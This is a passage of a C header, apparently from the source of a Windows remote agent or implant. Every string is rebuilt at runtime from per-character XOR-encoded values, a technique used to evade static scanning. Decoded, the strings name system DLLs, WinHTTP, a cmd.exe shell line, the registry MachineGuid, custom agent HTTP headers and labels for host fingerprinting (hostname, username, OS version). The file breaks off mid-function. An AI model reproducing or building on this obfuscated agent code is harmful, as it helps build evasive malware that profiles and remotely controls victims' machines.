#pragma once
#include "types.h"
#include "wintypes.h"

#define STACKSTR_KEY_KERNEL32 0x5A
#define STACKSTR_KEY_NTDLL 0x3C
#define STACKSTR_KEY_ADVAPI32 0xA7
#define STACKSTR_KEY_WINHTTP 0x71
#define STRLEN_BYTES_KERNEL32 24
#define STRLEN_BYTES_WINHTTP 22
#define STACKSTR_KEY_WIN 0x6B
#define STACKSTR_KEY_UA 0xC3
#define STACKSTR_KEY_CMD 0x94
#define STACKSTR_KEY_REG 0x37
#define STACKSTR_KEY_GUID 0x5D
#define STACKSTR_KEY_HASH 0x4E
#define STACKSTR_KEY_GETW 0x7A
#define STACKSTR_KEY_GET 0x7A
#define STACKSTR_KEY_X64 0x2D
#define STACKSTR_KEY_X86 0xE1

static VOID StrKernel32(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_KERNEL32;
    *(volatile WCHAR *)&buf[0] = (0x31u ^ key);
    *(volatile WCHAR *)&buf[1] = (0x3Fu ^ key);
    *(volatile WCHAR *)&buf[2] = (0x28u ^ key);
    *(volatile WCHAR *)&buf[3] = (0x34u ^ key);
    *(volatile WCHAR *)&buf[4] = (0x3Fu ^ key);
    *(volatile WCHAR *)&buf[5] = (0x36u ^ key);
    *(volatile WCHAR *)&buf[6] = (0x69u ^ key);
    *(volatile WCHAR *)&buf[7] = (0x68u ^ key);
    *(volatile WCHAR *)&buf[8] = (0x74u ^ key);
    *(volatile WCHAR *)&buf[9] = (0x3Eu ^ key);
    *(volatile WCHAR *)&buf[10] = (0x36u ^ key);
    *(volatile WCHAR *)&buf[11] = (0x36u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[12] = 0;
}

static VOID StrNtdll(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_NTDLL;
    *(volatile WCHAR *)&buf[0] = (0x52u ^ key);
    *(volatile WCHAR *)&buf[1] = (0x48u ^ key);
    *(volatile WCHAR *)&buf[2] = (0x58u ^ key);
    *(volatile WCHAR *)&buf[3] = (0x50u ^ key);
    *(volatile WCHAR *)&buf[4] = (0x50u ^ key);
    *(volatile WCHAR *)&buf[5] = (0x12u ^ key);
    *(volatile WCHAR *)&buf[6] = (0x58u ^ key);
    *(volatile WCHAR *)&buf[7] = (0x50u ^ key);
    *(volatile WCHAR *)&buf[8] = (0x50u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[9] = 0;
}

static VOID StrAdvapi32(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_ADVAPI32;
    *(volatile WCHAR *)&buf[0] = (0xC6u ^ key);
    *(volatile WCHAR *)&buf[1] = (0xC3u ^ key);
    *(volatile WCHAR *)&buf[2] = (0xD1u ^ key);
    *(volatile WCHAR *)&buf[3] = (0xC6u ^ key);
    *(volatile WCHAR *)&buf[4] = (0xD7u ^ key);
    *(volatile WCHAR *)&buf[5] = (0xCEu ^ key);
    *(volatile WCHAR *)&buf[6] = (0x94u ^ key);
    *(volatile WCHAR *)&buf[7] = (0x95u ^ key);
    *(volatile WCHAR *)&buf[8] = (0x89u ^ key);
    *(volatile WCHAR *)&buf[9] = (0xC3u ^ key);
    *(volatile WCHAR *)&buf[10] = (0xCBu ^ key);
    *(volatile WCHAR *)&buf[11] = (0xCBu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[12] = 0;
}

static VOID StrWinhttp(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_WINHTTP;
    *(volatile WCHAR *)&buf[0] = (0x06u ^ key);
    *(volatile WCHAR *)&buf[1] = (0x18u ^ key);
    *(volatile WCHAR *)&buf[2] = (0x1Fu ^ key);
    *(volatile WCHAR *)&buf[3] = (0x19u ^ key);
    *(volatile WCHAR *)&buf[4] = (0x05u ^ key);
    *(volatile WCHAR *)&buf[5] = (0x05u ^ key);
    *(volatile WCHAR *)&buf[6] = (0x01u ^ key);
    *(volatile WCHAR *)&buf[7] = (0x5Fu ^ key);
    *(volatile WCHAR *)&buf[8] = (0x15u ^ key);
    *(volatile WCHAR *)&buf[9] = (0x1Du ^ key);
    *(volatile WCHAR *)&buf[10] = (0x1Du ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[11] = 0;
}

static VOID StrUserAgent(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_UA;
    *(volatile WCHAR *)&buf[0] = (0xAEu ^ key);
    *(volatile WCHAR *)&buf[1] = (0xAAu ^ key);
    *(volatile WCHAR *)&buf[2] = (0xADu ^ key);
    *(volatile WCHAR *)&buf[3] = (0xAAu ^ key);
    *(volatile WCHAR *)&buf[4] = (0xAEu ^ key);
    *(volatile WCHAR *)&buf[5] = (0xA2u ^ key);
    *(volatile WCHAR *)&buf[6] = (0xAFu ^ key);
    *(volatile WCHAR *)&buf[7] = (0x9Cu ^ key);
    *(volatile WCHAR *)&buf[8] = (0xA2u ^ key);
    *(volatile WCHAR *)&buf[9] = (0xA4u ^ key);
    *(volatile WCHAR *)&buf[10] = (0xA6u ^ key);
    *(volatile WCHAR *)&buf[11] = (0xADu ^ key);
    *(volatile WCHAR *)&buf[12] = (0xB7u ^ key);
    *(volatile WCHAR *)&buf[13] = (0xECu ^ key);
    *(volatile WCHAR *)&buf[14] = (0xF2u ^ key);
    *(volatile WCHAR *)&buf[15] = (0xEDu ^ key);
    *(volatile WCHAR *)&buf[16] = (0xF3u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[17] = 0;
}

static VOID StrCmdline(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_CMD;
    *(volatile WCHAR *)&buf[0] = (0xF7u ^ key);
    *(volatile WCHAR *)&buf[1] = (0xF9u ^ key);
    *(volatile WCHAR *)&buf[2] = (0xF0u ^ key);
    *(volatile WCHAR *)&buf[3] = (0xBAu ^ key);
    *(volatile WCHAR *)&buf[4] = (0xF1u ^ key);
    *(volatile WCHAR *)&buf[5] = (0xECu ^ key);
    *(volatile WCHAR *)&buf[6] = (0xF1u ^ key);
    *(volatile WCHAR *)&buf[7] = (0xB4u ^ key);
    *(volatile WCHAR *)&buf[8] = (0xBBu ^ key);
    *(volatile WCHAR *)&buf[9] = (0xDFu ^ key);
    *(volatile WCHAR *)&buf[10] = (0xB4u ^ key);
    *(volatile WCHAR *)&buf[11] = (0xF7u ^ key);
    *(volatile WCHAR *)&buf[12] = (0xFCu ^ key);
    *(volatile WCHAR *)&buf[13] = (0xF7u ^ key);
    *(volatile WCHAR *)&buf[14] = (0xE4u ^ key);
    *(volatile WCHAR *)&buf[15] = (0xB4u ^ key);
    *(volatile WCHAR *)&buf[16] = (0xA2u ^ key);
    *(volatile WCHAR *)&buf[17] = (0xA1u ^ key);
    *(volatile WCHAR *)&buf[18] = (0xA4u ^ key);
    *(volatile WCHAR *)&buf[19] = (0xA4u ^ key);
    *(volatile WCHAR *)&buf[20] = (0xA5u ^ key);
    *(volatile WCHAR *)&buf[21] = (0xB4u ^ key);
    *(volatile WCHAR *)&buf[22] = (0xAAu ^ key);
    *(volatile WCHAR *)&buf[23] = (0xFAu ^ key);
    *(volatile WCHAR *)&buf[24] = (0xE1u ^ key);
    *(volatile WCHAR *)&buf[25] = (0xF8u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[26] = 0;
}

static VOID StrRegPath(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_REG;
    *(volatile CHAR *)&buf[0] = (0x64u ^ key);
    *(volatile CHAR *)&buf[1] = (0x78u ^ key);
    *(volatile CHAR *)&buf[2] = (0x71u ^ key);
    *(volatile CHAR *)&buf[3] = (0x63u ^ key);
    *(volatile CHAR *)&buf[4] = (0x60u ^ key);
    *(volatile CHAR *)&buf[5] = (0x76u ^ key);
    *(volatile CHAR *)&buf[6] = (0x65u ^ key);
    *(volatile CHAR *)&buf[7] = (0x72u ^ key);
    *(volatile CHAR *)&buf[8] = (0x6Bu ^ key);
    *(volatile CHAR *)&buf[9] = (0x7Au ^ key);
    *(volatile CHAR *)&buf[10] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[11] = (0x54u ^ key);
    *(volatile CHAR *)&buf[12] = (0x45u ^ key);
    *(volatile CHAR *)&buf[13] = (0x58u ^ key);
    *(volatile CHAR *)&buf[14] = (0x44u ^ key);
    *(volatile CHAR *)&buf[15] = (0x58u ^ key);
    *(volatile CHAR *)&buf[16] = (0x51u ^ key);
    *(volatile CHAR *)&buf[17] = (0x43u ^ key);
    *(volatile CHAR *)&buf[18] = (0x6Bu ^ key);
    *(volatile CHAR *)&buf[19] = (0x74u ^ key);
    *(volatile CHAR *)&buf[20] = (0x45u ^ key);
    *(volatile CHAR *)&buf[21] = (0x4Eu ^ key);
    *(volatile CHAR *)&buf[22] = (0x47u ^ key);
    *(volatile CHAR *)&buf[23] = (0x43u ^ key);
    *(volatile CHAR *)&buf[24] = (0x58u ^ key);
    *(volatile CHAR *)&buf[25] = (0x50u ^ key);
    *(volatile CHAR *)&buf[26] = (0x45u ^ key);
    *(volatile CHAR *)&buf[27] = (0x56u ^ key);
    *(volatile CHAR *)&buf[28] = (0x47u ^ key);
    *(volatile CHAR *)&buf[29] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[30] = (0x4Eu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[31] = 0;
}

static VOID StrMachineGuid(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_GUID;
    *(volatile CHAR *)&buf[0] = (0x10u ^ key);
    *(volatile CHAR *)&buf[1] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[2] = (0x3Eu ^ key);
    *(volatile CHAR *)&buf[3] = (0x35u ^ key);
    *(volatile CHAR *)&buf[4] = (0x34u ^ key);
    *(volatile CHAR *)&buf[5] = (0x33u ^ key);
    *(volatile CHAR *)&buf[6] = (0x38u ^ key);
    *(volatile CHAR *)&buf[7] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[8] = (0x28u ^ key);
    *(volatile CHAR *)&buf[9] = (0x34u ^ key);
    *(volatile CHAR *)&buf[10] = (0x39u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[11] = 0;
}

static VOID StrEnvUrl(PCHAR buf)
{
    volatile UINT32 key = 0x4D;
    *(volatile CHAR *)&buf[0] = (0x18u ^ key);
    *(volatile CHAR *)&buf[1] = (0x1Fu ^ key);
    *(volatile CHAR *)&buf[2] = (0x01u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
}

static VOID StrCommitDefault(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_HASH;
    *(volatile CHAR *)&buf[0] = (0x2Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x21u ^ key);
    *(volatile CHAR *)&buf[2] = (0x3Bu ^ key);
    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[4] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[5] = (0x2Bu ^ key);
    *(volatile CHAR *)&buf[6] = (0x7Eu ^ key);
    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
}

static VOID StrX64(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_X64;
    *(volatile CHAR *)&buf[0] = (0x55u ^ key);
    *(volatile CHAR *)&buf[1] = (0x1Bu ^ key);
    *(volatile CHAR *)&buf[2] = (0x19u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
}

static VOID StrX86(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_X86;
    *(volatile CHAR *)&buf[0] = (0x99u ^ key);
    *(volatile CHAR *)&buf[1] = (0xD9u ^ key);
    *(volatile CHAR *)&buf[2] = (0xD7u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
}

static VOID StrGetMethod(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_GET;
    *(volatile CHAR *)&buf[0] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x3Fu ^ key);
    *(volatile CHAR *)&buf[2] = (0x2Eu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
}

static VOID StrGetMethodW(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_GETW;
    *(volatile WCHAR *)&buf[0] = (0x3Du ^ key);
    *(volatile WCHAR *)&buf[1] = (0x3Fu ^ key);
    *(volatile WCHAR *)&buf[2] = (0x2Eu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
}

static VOID StrHdrApiVersion(PCHAR buf)
{
    volatile UINT32 key = 0x6B;
    *(volatile CHAR *)&buf[0] = (0x33u ^ key);
    *(volatile CHAR *)&buf[1] = (0x46u ^ key);
    *(volatile CHAR *)&buf[2] = (0x2Au ^ key);
    *(volatile CHAR *)&buf[3] = (0x0Cu ^ key);
    *(volatile CHAR *)&buf[4] = (0x0Eu ^ key);
    *(volatile CHAR *)&buf[5] = (0x05u ^ key);
    *(volatile CHAR *)&buf[6] = (0x1Fu ^ key);
    *(volatile CHAR *)&buf[7] = (0x46u ^ key);
    *(volatile CHAR *)&buf[8] = (0x2Au ^ key);
    *(volatile CHAR *)&buf[9] = (0x1Bu ^ key);
    *(volatile CHAR *)&buf[10] = (0x02u ^ key);
    *(volatile CHAR *)&buf[11] = (0x46u ^ key);
    *(volatile CHAR *)&buf[12] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[13] = (0x0Eu ^ key);
    *(volatile CHAR *)&buf[14] = (0x19u ^ key);
    *(volatile CHAR *)&buf[15] = (0x18u ^ key);
    *(volatile CHAR *)&buf[16] = (0x02u ^ key);
    *(volatile CHAR *)&buf[17] = (0x04u ^ key);
    *(volatile CHAR *)&buf[18] = (0x05u ^ key);
    *(volatile CHAR *)&buf[19] = (0x51u ^ key);
    *(volatile CHAR *)&buf[20] = (0x4Bu ^ key);
    *(volatile CHAR *)&buf[21] = (0x5Au ^ key);
    *(volatile CHAR *)&buf[22] = (0x66u ^ key);
    *(volatile CHAR *)&buf[23] = (0x61u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[24] = 0;
}

static VOID StrHdrNameId(PCHAR buf)
{
    volatile UINT32 key = 0x39;
    *(volatile CHAR *)&buf[0] = (0x61u ^ key);
    *(volatile CHAR *)&buf[1] = (0x14u ^ key);
    *(volatile CHAR *)&buf[2] = (0x78u ^ key);
    *(volatile CHAR *)&buf[3] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[4] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[5] = (0x57u ^ key);
    *(volatile CHAR *)&buf[6] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[7] = (0x14u ^ key);
    *(volatile CHAR *)&buf[8] = (0x77u ^ key);
    *(volatile CHAR *)&buf[9] = (0x58u ^ key);
    *(volatile CHAR *)&buf[10] = (0x54u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[12] = (0x14u ^ key);
    *(volatile CHAR *)&buf[13] = (0x70u ^ key);
    *(volatile CHAR *)&buf[14] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[15] = (0x03u ^ key);
    *(volatile CHAR *)&buf[16] = (0x19u ^ key);
    *(volatile CHAR *)&buf[17] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[18] = (0x34u ^ key);
    *(volatile CHAR *)&buf[19] = (0x33u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[20] = 0;
}

static VOID StrHdrPlatform(PCHAR buf)
{
    volatile UINT32 key = 0x52;
    *(volatile CHAR *)&buf[0] = (0x0Au ^ key);
    *(volatile CHAR *)&buf[1] = (0x7Fu ^ key);
    *(volatile CHAR *)&buf[2] = (0x13u ^ key);
    *(volatile CHAR *)&buf[3] = (0x35u ^ key);
    *(volatile CHAR *)&buf[4] = (0x37u ^ key);
    *(volatile CHAR *)&buf[5] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[6] = (0x26u ^ key);
    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
    *(volatile CHAR *)&buf[8] = (0x02u ^ key);
    *(volatile CHAR *)&buf[9] = (0x3Eu ^ key);
    *(volatile CHAR *)&buf[10] = (0x33u ^ key);
    *(volatile CHAR *)&buf[11] = (0x26u ^ key);
    *(volatile CHAR *)&buf[12] = (0x34u ^ key);
    *(volatile CHAR *)&buf[13] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[14] = (0x20u ^ key);
    *(volatile CHAR *)&buf[15] = (0x3Fu ^ key);
    *(volatile CHAR *)&buf[16] = (0x68u ^ key);
    *(volatile CHAR *)&buf[17] = (0x72u ^ key);
    *(volatile CHAR *)&buf[18] = (0x25u ^ key);
    *(volatile CHAR *)&buf[19] = (0x3Bu ^ key);
    *(volatile CHAR *)&buf[20] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[21] = (0x36u ^ key);
    *(volatile CHAR *)&buf[22] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[23] = (0x25u ^ key);
    *(volatile CHAR *)&buf[24] = (0x21u ^ key);
    *(volatile CHAR *)&buf[25] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[26] = (0x58u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[27] = 0;
}

static VOID StrHdrCaps(PCHAR buf)
{
    volatile UINT32 key = 0x7D;
    *(volatile CHAR *)&buf[0] = (0x25u ^ key);
    *(volatile CHAR *)&buf[1] = (0x50u ^ key);
    *(volatile CHAR *)&buf[2] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[3] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[4] = (0x18u ^ key);
    *(volatile CHAR *)&buf[5] = (0x13u ^ key);
    *(volatile CHAR *)&buf[6] = (0x09u ^ key);
    *(volatile CHAR *)&buf[7] = (0x50u ^ key);
    *(volatile CHAR *)&buf[8] = (0x3Eu ^ key);
    *(volatile CHAR *)&buf[9] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[10] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[11] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[12] = (0x1Fu ^ key);
    *(volatile CHAR *)&buf[13] = (0x14u ^ key);
    *(volatile CHAR *)&buf[14] = (0x11u ^ key);
    *(volatile CHAR *)&buf[15] = (0x14u ^ key);
    *(volatile CHAR *)&buf[16] = (0x09u ^ key);
    *(volatile CHAR *)&buf[17] = (0x14u ^ key);
    *(volatile CHAR *)&buf[18] = (0x18u ^ key);
    *(volatile CHAR *)&buf[19] = (0x0Eu ^ key);
    *(volatile CHAR *)&buf[20] = (0x47u ^ key);
    *(volatile CHAR *)&buf[21] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[22] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[23] = (0x4Cu ^ key);
    *(volatile CHAR *)&buf[24] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[25] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[26] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[27] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[28] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[29] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[30] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[31] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[32] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[33] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[34] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[35] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[36] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[37] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[38] = (0x70u ^ key);
    *(volatile CHAR *)&buf[39] = (0x77u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[40] = 0;
}

static VOID StrLblUuid(PCHAR buf)
{
    volatile UINT32 key = 0x1F;
    *(volatile CHAR *)&buf[0] = (0x47u ^ key);
    *(volatile CHAR *)&buf[1] = (0x32u ^ key);
    *(volatile CHAR *)&buf[2] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[3] = (0x78u ^ key);
    *(volatile CHAR *)&buf[4] = (0x7Au ^ key);
    *(volatile CHAR *)&buf[5] = (0x71u ^ key);
    *(volatile CHAR *)&buf[6] = (0x6Bu ^ key);
    *(volatile CHAR *)&buf[7] = (0x32u ^ key);
    *(volatile CHAR *)&buf[8] = (0x52u ^ key);
    *(volatile CHAR *)&buf[9] = (0x7Eu ^ key);
    *(volatile CHAR *)&buf[10] = (0x7Cu ^ key);
    *(volatile CHAR *)&buf[11] = (0x77u ^ key);
    *(volatile CHAR *)&buf[12] = (0x76u ^ key);
    *(volatile CHAR *)&buf[13] = (0x71u ^ key);
    *(volatile CHAR *)&buf[14] = (0x7Au ^ key);
    *(volatile CHAR *)&buf[15] = (0x32u ^ key);
    *(volatile CHAR *)&buf[16] = (0x4Au ^ key);
    *(volatile CHAR *)&buf[17] = (0x6Au ^ key);
    *(volatile CHAR *)&buf[18] = (0x76u ^ key);
    *(volatile CHAR *)&buf[19] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[20] = (0x25u ^ key);
    *(volatile CHAR *)&buf[21] = (0x3Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[22] = 0;
}

static VOID StrLblHostname(PCHAR buf)
{
    volatile UINT32 key = 0x64;
    *(volatile CHAR *)&buf[0] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[1] = (0x49u ^ key);
    *(volatile CHAR *)&buf[2] = (0x25u ^ key);
    *(volatile CHAR *)&buf[3] = (0x03u ^ key);
    *(volatile CHAR *)&buf[4] = (0x01u ^ key);
    *(volatile CHAR *)&buf[5] = (0x0Au ^ key);
    *(volatile CHAR *)&buf[6] = (0x10u ^ key);
    *(volatile CHAR *)&buf[7] = (0x49u ^ key);
    *(volatile CHAR *)&buf[8] = (0x2Cu ^ key);
    *(volatile CHAR *)&buf[9] = (0x0Bu ^ key);
    *(volatile CHAR *)&buf[10] = (0x17u ^ key);
    *(volatile CHAR *)&buf[11] = (0x10u ^ key);
    *(volatile CHAR *)&buf[12] = (0x0Au ^ key);
    *(volatile CHAR *)&buf[13] = (0x05u ^ key);
    *(volatile CHAR *)&buf[14] = (0x09u ^ key);
    *(volatile CHAR *)&buf[15] = (0x01u ^ key);
    *(volatile CHAR *)&buf[16] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[17] = (0x44u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[18] = 0;
}

static VOID StrLblUsername(PCHAR buf)
{
    volatile UINT32 key = 0x2A;
    *(volatile CHAR *)&buf[0] = (0x72u ^ key);
    *(volatile CHAR *)&buf[1] = (0x07u ^ key);
    *(volatile CHAR *)&buf[2] = (0x6Bu ^ key);
    *(volatile CHAR *)&buf[3] = (0x4Du ^ key);
    *(volatile CHAR *)&buf[4] = (0x4Fu ^ key);
    *(volatile CHAR *)&buf[5] = (0x44u ^ key);
    *(volatile CHAR *)&buf[6] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[7] = (0x07u ^ key);
    *(volatile CHAR *)&buf[8] = (0x7Fu ^ key);
    *(volatile CHAR *)&buf[9] = (0x59u ^ key);
    *(volatile CHAR *)&buf[10] = (0x4Fu ^ key);
    *(volatile CHAR *)&buf[11] = (0x58u ^ key);
    *(volatile CHAR *)&buf[12] = (0x44u ^ key);
    *(volatile CHAR *)&buf[13] = (0x4Bu ^ key);
    *(volatile CHAR *)&buf[14] = (0x47u ^ key);
    *(volatile CHAR *)&buf[15] = (0x4Fu ^ key);
    *(volatile CHAR *)&buf[16] = (0x10u ^ key);
    *(volatile CHAR *)&buf[17] = (0x0Au ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[18] = 0;
}

static VOID StrLblOsVersion(PCHAR buf)
{
    volatile UINT32 key = 0x53;
    *(volatile CHAR *)&buf[0] = (0x0Bu ^ key);
    *(volatile CHAR *)&buf[1] = (0x7Eu ^ key);
    *(volatile CHAR *)&buf[2] = (0x12u ^ key);
    *(volatile CHAR *)&buf[3] = (0x34u ^ key);
    *(volatile CHAR *)&buf[4] = (0x36u ^ key);
    *(volatile CHAR *)&buf[5] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[6] = (0x27u ^ key);
    *(volatile CHAR *)&buf[7] = (0x7Eu ^ key);
    *(volatile CHAR *)&buf[8] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[9] = (0x20u ^ key);
    *(volatile CHAR *)&buf[10] = (0x7Eu ^ key);
    *(volatile CHAR *)&buf[11] = (0x05u ^ key);
    *(volatile CHAR *)&buf[12] = (0x36u ^ key);
    *(volatile CHAR *)&buf[13] = (0x21u ^ key);
    *(volatile CHAR *)&buf[14] = (0x20u ^ key);
    *(volatile CHAR *)&buf[15] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[16] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[17] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[18] = (0x69u ^ key);
    *(volatile CHAR *)&buf[19] = (0x73u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[20] = 0;
}

static VOID StrLblBuild(PCHAR buf)
{
    volatile UINT32 key = 0x30;
    *(volatile CHAR *)&buf[0] = (0x68u ^ key);
    *(volatile CHAR *)&buf[1] = (0x1Du ^ key);
    *(volatile CHAR *)&buf[2] = (0x71u ^ key);
    *(volatile CHAR *)&buf[3] = (0x57u ^ key);
    *(volatile CHAR *)&buf[4] = (0x55u ^ key);
    *(volatile CHAR *)&buf[5] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[6] = (0x44u ^ key);
    *(volatile CHAR *)&buf[7] = (0x1Du ^ key);
    *(volatile CHAR *)&buf[8] = (0x72u ^ key);
    *(volatile CHAR *)&buf[9] = (0x45u ^ key);
    *(volatile CHAR *)&buf[10] = (0x59u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[12] = (0x54u ^ key);
    *(volatile CHAR *)&buf[13] = (0x0Au ^ key);
    *(volatile CHAR *)&buf[14] = (0x10u ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[15] = 0;
}

static VOID StrLblCommit(PCHAR buf)
{
    volatile UINT32 key = 0x5B;
    *(volatile CHAR *)&buf[0] = (0x03u ^ key);
    *(volatile CHAR *)&buf[1] = (0x76u ^ key);
    *(volatile CHAR *)&buf[2] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[4] = (0x3Eu ^ key);
    *(volatile CHAR *)&buf[5] = (0x35u ^ key);
    *(volatile CHAR *)&buf[6] = (0x2Fu ^ key);
    *(volatile CHAR *)&buf[7] = (0x76u ^ key);
    *(volatile CHAR *)&buf[8] = (0x18u ^ key);
    *(volatile CHAR *)&buf[9] = (0x34u ^ key);
    *(volatile CHAR *)&buf[10] = (0x36u ^ key);
    *(volatile CHAR *)&buf[11] = (0x36u ^ key);
    *(volatile CHAR *)&buf[12] = (0x32u ^ key);
    *(volatile CHAR *)&buf[13] = (0x2Fu ^ key);
    *(volatile CHAR *)&buf[14] = (0x61u ^ key);
    *(volatile CHAR *)&buf[15] = (0x7Bu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[16] = 0;
}

static VOID StrValArchX64(PCHAR buf)
{
    volatile UINT32 key = 0x24;
    *(volatile CHAR *)&buf[0] = (0x7Cu ^ key);
    *(volatile CHAR *)&buf[1] = (0x09u ^ key);
    *(volatile CHAR *)&buf[2] = (0x65u ^ key);
    *(volatile CHAR *)&buf[3] = (0x43u ^ key);
    *(volatile CHAR *)&buf[4] = (0x41u ^ key);
    *(volatile CHAR *)&buf[5] = (0x4Au ^ key);
    *(volatile CHAR *)&buf[6] = (0x50u ^ key);
    *(volatile CHAR *)&buf[7] = (0x09u ^ key);
    *(volatile CHAR *)&buf[8] = (0x65u ^ key);
    *(volatile CHAR *)&buf[9] = (0x56u ^ key);
    *(volatile CHAR *)&buf[10] = (0x47u ^ key);
    *(volatile CHAR *)&buf[11] = (0x4Cu ^ key);
    *(volatile CHAR *)&buf[12] = (0x1Eu ^ key);
    *(volatile CHAR *)&buf[13] = (0x04u ^ key);
    *(volatile CHAR *)&buf[14] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[15] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[16] = (0x12u ^ key);
    *(volatile CHAR *)&buf[17] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[18] = (0x12u ^ key);
    *(volatile CHAR *)&buf[19] = (0x10u ^ key);
    *(volatile CHAR *)&buf[20] = (0x29u ^ key);
    *(volatile CHAR *)&buf[21] = (0x2Eu ^ key);
    *(volatile CHAR *)&buf[22] = (0x7Cu ^ key);
    *(volatile CHAR *)&buf[23] = (0x09u ^ key);
    *(volatile CHAR *)&buf[24] = (0x65u ^ key);
    *(volatile CHAR *)&buf[25] = (0x43u ^ key);
    *(volatile CHAR *)&buf[26] = (0x41u ^ key);
    *(volatile CHAR *)&buf[27] = (0x4Au ^ key);
    *(volatile CHAR *)&buf[28] = (0x50u ^ key);
    *(volatile CHAR *)&buf[29] = (0x09u ^ key);
    *(volatile CHAR *)&buf[30] = (0x74u ^ key);
    *(volatile CHAR *)&buf[31] = (0x56u ^ key);
    *(volatile CHAR *)&buf[32] = (0x4Bu ^ key);
    *(volatile CHAR *)&buf[33] = (0x47u ^ key);
